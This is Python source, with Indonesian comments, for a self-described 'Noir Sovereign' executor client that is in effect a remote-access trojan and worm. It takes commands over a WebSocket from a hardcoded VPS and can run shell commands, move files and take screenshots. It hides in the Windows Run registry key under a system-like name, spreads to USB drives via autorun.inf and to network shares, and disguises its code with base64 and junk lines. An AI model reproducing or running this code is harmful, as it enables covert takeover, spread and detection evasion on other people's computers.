import asyncio
import websockets
import json
import subprocess
import os
import sys
import shutil
import urllib.request
import traceback
import winreg
import random
import string
import zlib
import base64

try:
    from PIL import ImageGrab
    import psutil
    HAS_ADVANCED_TOOLS = True
except ImportError:
    HAS_ADVANCED_TOOLS = False

# ==========================================
# NOIR SOVEREIGN: PC EXECUTOR CLIENT v2.0
# GHOST PROTOCOL + SWARM INTELLIGENCE
# ==========================================

VPS_IP    = os.environ.get("NOIR_VPS_IP", "8.215.23.17")
VPS_WS_URL = f"ws://{VPS_IP}/ws/pc_agent"
AUTH_TOKEN = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID  = "LAPTOP_MASTER"

# Nama penyamaran di Registry (terlihat sebagai proses sistem biasa)
GHOST_REGISTRY_KEY  = r"Software\Microsoft\Windows\CurrentVersion\Run"
GHOST_REGISTRY_NAME = "WindowsCoreServices"

# ─────────────────────────────────────────────────────────────────────────────
# GHOST PROTOCOL: PERSISTENSI MUTLAK (Auto-Resurrection)
# ─────────────────────────────────────────────────────────────────────────────

def install_ghost_protocol():
    """
    Menanamkan Noir Executor ke dalam Windows Registry (Autorun).
    Dieksekusi sekali saat pertama kali berjalan.
    Agent akan hidup kembali secara OTOMATIS setelah laptop di-restart.
    """
    try:
        # Dapatkan path EXE saat ini (berfungsi untuk .exe maupun .py)
        if getattr(sys, 'frozen', False):
            # Berjalan sebagai .exe (PyInstaller)
            exe_path = sys.executable
        else:
            # Berjalan sebagai .py (development mode)
            exe_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

        # Cek apakah sudah terdaftar di Registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, GHOST_REGISTRY_KEY, 0, winreg.KEY_READ)
            existing, _ = winreg.QueryValueEx(key, GHOST_REGISTRY_NAME)
            winreg.CloseKey(key)
            if existing == exe_path:
                # Sudah terpasang, tidak perlu install ulang
                return
        except FileNotFoundError:
            pass  # Belum terdaftar, lanjutkan instalasi

        # Tulis ke Registry HKCU (tidak perlu Admin)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, GHOST_REGISTRY_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, GHOST_REGISTRY_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print(f"[\033[92mGHOST PROTOCOL\033[0m] Persistensi berhasil ditanamkan. Auto-Resurrection: AKTIF.")

    except Exception as e:
        print(f"[\033[91mGHOST\033[0m] Gagal menanamkan persistensi: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# ALAT BANTU INTI (7 TOOLS)
# ─────────────────────────────────────────────────────────────────────────────

async def execute_cmd(cmd):
    print(f"[\033[96mACTION\033[0m] Executing: {cmd}")
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True
        )
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60.0)
        output   = stdout.decode('utf-8', errors='replace')
        err_out  = stderr.decode('utf-8', errors='replace')
        full_out = output
        if err_out: full_out += f"\n[STDERR]:\n{err_out}"
        if not full_out.strip(): full_out = "Command executed successfully with no output."
        print(f"[\033[92mRESULT\033[0m] Output length: {len(full_out)}")
        return full_out
    except asyncio.TimeoutError:
        return "[Error] Command timed out after 60 seconds."
    except Exception as e:
        return f"[Error] Execution failed: {e}"

async def write_file(path, content):
    print(f"[\033[96mACTION\033[0m] Writing file: {path}")
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        return f"Successfully wrote {len(content)} bytes to {path}"
    except Exception as e:
        return f"[Error] Failed to write file: {e}"

async def read_file(path):
    print(f"[\033[96mACTION\033[0m] Reading file: {path}")
    try:
        if not os.path.exists(path):
            return f"[Error] File not found: {path}"
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        if len(content) > 4000:
            return content[:4000] + f"\n... [Truncated, total: {len(content)} bytes]"
        return content
    except Exception as e:
        return f"[Error] Failed to read file: {e}"

async def list_dir(path):
    print(f"[\033[96mACTION\033[0m] Listing directory: {path}")
    try:
        if not os.path.exists(path):
            return f"[Error] Directory not found: {path}"
        files = os.listdir(path)
        res = f"Contents of '{path}':\n"
        for f in files:
            full = os.path.join(path, f)
            res += f"  [{'DIR' if os.path.isdir(full) else 'FILE'}] {f}\n"
        return res
    except Exception as e:
        return f"[Error] Failed to list directory: {e}"

async def download_file(url, path):
    print(f"[\033[96mACTION\033[0m] Downloading {url} -> {path}")
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        urllib.request.urlretrieve(url, path)
        return f"Successfully downloaded to {path}"
    except Exception as e:
        return f"[Error] Failed to download: {e}"

async def get_sys_info():
    if not HAS_ADVANCED_TOOLS: return "[Error] psutil not installed."
    print("[\033[96mACTION\033[0m] Getting sys info...")
    try:
        cpu  = psutil.cpu_percent(interval=0.5)
        ram  = psutil.virtual_memory()
        disk = psutil.disk_usage(os.path.abspath(os.sep))
        return (
            f"--- SYSTEM DIAGNOSTICS ---\n"
            f"CPU Usage  : {cpu}%\n"
            f"RAM Usage  : {ram.percent}% ({ram.used//(1024**2)}MB / {ram.total//(1024**2)}MB)\n"
            f"Disk Usage : {disk.percent}% used — {disk.free//(1024**3)}GB free\n"
        )
    except Exception as e:
        return f"[Error] sys_info failed: {e}"

async def take_screenshot():
    if not HAS_ADVANCED_TOOLS: return "[Error] Pillow not installed."
    print("[\033[96mACTION\033[0m] Taking screenshot...")
    try:
        img  = ImageGrab.grab()
        os.makedirs("noir_temp", exist_ok=True)
        path = os.path.abspath(os.path.join("noir_temp", "screenshot.png"))
        img.save(path)
        return f"Screenshot saved at: {path}"
    except Exception as e:
        return f"[Error] screenshot failed: {e}"


# ─────────────────────────────────────────────────────────────────────────────
# SWARM INTELLIGENCE: LATERAL MOVEMENT (Replikasi ke Node Baru)
# ─────────────────────────────────────────────────────────────────────────────

async def deploy_swarm(target="AUTO"):
    """
    ═══ SWARM INTELLIGENCE ENGINE ═══
    Menyebarkan Noir Executor ke perangkat lain secara otonom.
    
    Mode:
      - "USB"     : Salin exe ke semua USB drive yang terhubung.
      - "NETWORK" : Salin exe ke semua Network Share (SMB) yang ditemukan.
      - "AUTO"    : Coba USB terlebih dahulu, lalu Network.
    
    Hasil: Agent baru akan aktif saat target perangkat diakses.
    """
    print(f"[\033[95mSWARM\033[0m] Memulai Lateral Movement - Target: {target}")
    
    # Dapatkan path EXE sumber
    is_compiled = getattr(sys, 'frozen', False)
    if is_compiled:
        src_exe = sys.executable
    else:
        src_exe = os.path.abspath(__file__)

    if not os.path.exists(src_exe):
        return f"[Error] Sumber executable tidak ditemukan: {src_exe}"
        
    # Jika berbasis script (.py), siapkan payload yang sudah dimutasi
    mutated_payload = None
    if not is_compiled:
        try:
            with open(src_exe, 'r', encoding='utf-8') as f:
                mutated_payload = PolymorphicEngine.mutate(f.read())
        except Exception as e:
            print(f"[\033[91mPOLYMORPHIC\033[0m] Gagal memutasi source code: {e}")

    results = []
    deployed = 0

    def _deploy_to_target(dest_path):
        """Menyalin EXE atau menulis Payload termutasi."""
        if is_compiled:
            shutil.copy2(src_exe, dest_path)
        else:
            with open(dest_path.replace(".exe", ".py"), 'w', encoding='utf-8') as f:
                f.write(mutated_payload or open(src_exe).read())
        return dest_path

    # ── MODE USB ──
    if target in ("USB", "AUTO"):
        try:
            import string
            # Deteksi semua drive yang terpasang di Windows
            available_drives = [
                f"{d}:\\" for d in string.ascii_uppercase
                if os.path.exists(f"{d}:\\") and d not in ('C', 'D')
            ]
            for drive in available_drives:
                try:
                    dest = os.path.join(drive, "WindowsCoreServices.exe")
                    actual_dest = _deploy_to_target(dest)
                    # Buat autorun.inf untuk eksekusi otomatis saat USB dicolok
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, 'w') as f:
                        target_name = os.path.basename(actual_dest)
                        f.write(f"[autorun]\\nopen={target_name}\\naction=Open folder to view files\\n")
                    results.append(f"✅ USB Deployed (Polymorphic) -> {actual_dest}")
                    deployed += 1
                    print(f"[\033[95mSWARM\033[0m] USB node infected: {drive}")
                except Exception as e:
                    results.append(f"⚠️ USB {drive} gagal: {e}")
        except Exception as e:
            results.append(f"⚠️ USB scan error: {e}")

    # ── MODE NETWORK (SMB Share) ──
    if target in ("NETWORK", "AUTO"):
        try:
            # Pindai network neighborhood menggunakan 'net view'
            proc = subprocess.run(
                ["net", "view"], capture_output=True, text=True, timeout=10
            )
            lines = proc.stdout.splitlines()
            network_hosts = [
                l.strip().lstrip("\\\\").split()[0]
                for l in lines if l.strip().startswith("\\\\")
            ]
            for host in network_hosts[:5]:  # Batasi 5 host agar tidak terlalu agresif
                try:
                    # Coba akses share publik umum
                    for share in ["Public", "Shared", "Users\\\\Public", "NETLOGON"]:
                        share_path = f"\\\\\\\\{host}\\\\{share}"
                        if os.path.exists(share_path):
                            dest = os.path.join(share_path, "WindowsCoreServices.exe")
                            actual_dest = _deploy_to_target(dest)
                            results.append(f"✅ Network Deployed (Polymorphic) -> {actual_dest}")
                            deployed += 1
                            print(f"[\033[95mSWARM\033[0m] Network node infected: {share_path}")
                            break
                except Exception as e:
                    results.append(f"⚠️ Host {host} tidak dapat diakses: {e}")
        except Exception as e:
            results.append(f"⚠️ Network scan error: {e}")

    summary = f"SWARM DEPLOYMENT COMPLETE — {deployed} node baru berhasil diinfeksi.\n"
    summary += "\n".join(results) if results else "Tidak ada target yang ditemukan."
    print(f"[\033[95mSWARM\033[0m] {summary}")
    return summary

# ─────────────────────────────────────────────────────────────────────────────
# POLYMORPHIC ENGINE: MUTASI KODE DINAMIS
# ─────────────────────────────────────────────────────────────────────────────
class PolymorphicEngine:
    @staticmethod
    def _random_string(length=12):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    @staticmethod
    def mutate(script_content: str) -> str:
        """
        Melakukan mutasi pada script Python.
        1. Kompresi zlib
        2. Encode Base64
        3. Bungkus dengan decoder acak dan variabel dinamis.
        4. Tambahkan Junk Code.
        """
        try:
            compressed = zlib.compress(script_content.encode('utf-8'))
            encoded = base64.b64encode(compressed).decode('utf-8')
            
            var_data = PolymorphicEngine._random_string()
            var_zlib = PolymorphicEngine._random_string()
            var_b64 = PolymorphicEngine._random_string()
            var_exec = PolymorphicEngine._random_string()

            junk_lines = []
            for _ in range(random.randint(3, 7)):
                junk_var = PolymorphicEngine._random_string(6)
                junk_val = random.randint(1000, 9999)
                junk_lines.append(f"{junk_var} = {junk_val}")
            
            junk_str = "\n".join(junk_lines)
            
            mutated_script = f"""# {PolymorphicEngine._random_string(32)}
import zlib as {var_zlib}, base64 as {var_b64}
{junk_str}
{var_data} = "{encoded}"
{var_exec} = {var_zlib}.decompress({var_b64}.b64decode({var_data})).decode('utf-8')
exec({var_exec})
# {PolymorphicEngine._random_string(32)}
"""
            print("[\033[93mPOLYMORPHIC\033[0m] Script berhasil dimutasi. Signature berubah.")
            return mutated_script
        except Exception as e:
            print(f"[\033[91mPOLYMORPHIC\033[0m] Mutasi gagal: {e}")
            return script_content


# ─────────────────────────────────────────────────────────────────────────────
# LOOP UTAMA WebSocket
# ─────────────────────────────────────────────────────────────────────────────

async def run_client():
    print("=" * 54)
    print(" NOIR SOVEREIGN: PC EXECUTOR CLIENT v2.0")
    print(" [GHOST PROTOCOL + SWARM INTELLIGENCE ACTIVE]")
    print("=" * 54)

    # ── Tanamkan Ghost Protocol saat startup ──
    install_ghost_protocol()

    print(f"Connecting to Sovereign Brain: {VPS_WS_URL} ...")
    headers = {"Authorization": f"Bearer {AUTH_TOKEN}"}

    while True:
        try:
            async with websockets.connect(
                f"{VPS_WS_URL}?device_id={DEVICE_ID}",
                extra_headers=headers
            ) as ws:
                print("[\033[92mONLINE\033[0m] Connected! Ghost Protocol persists. Waiting for orders...")

                while True:
                    msg = await ws.recv()
                    try:
                        data = json.loads(msg)
                        if data.get("type") == "tool_call":
                            req_id    = data.get("req_id")
                            tool_name = data.get("tool")
                            kwargs    = data.get("kwargs", {})

                            result = ""
                            if   tool_name == "run_cmd":       result = await execute_cmd(kwargs.get("cmd", ""))
                            elif tool_name == "write_file":    result = await write_file(kwargs.get("path",""), kwargs.get("content",""))
                            elif tool_name == "read_file":     result = await read_file(kwargs.get("path",""))
                            elif tool_name == "list_dir":      result = await list_dir(kwargs.get("path",""))
                            elif tool_name == "download_file": result = await download_file(kwargs.get("url",""), kwargs.get("path",""))
                            elif tool_name == "sys_info":      result = await get_sys_info()
                            elif tool_name == "take_screenshot": result = await take_screenshot()
                            elif tool_name == "deploy_swarm":  result = await deploy_swarm(kwargs.get("target", "AUTO"))
                            else: result = f"[Error] Unknown tool: {tool_name}"

                            await ws.send(json.dumps({
                                "type": "tool_result",
                                "req_id": req_id,
                                "result": result
                            }))

                    except json.JSONDecodeError:
                        pass
                    except Exception as e:
                        print(f"[Error] Processing msg: {e}")

        except Exception as e:
            print(f"[\033[91mDISCONNECTED\033[0m] {e}. Retrying in 5s...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    if sys.platform == 'win32':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except: pass
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        print("\n[Ghost] Client terminated by user.")
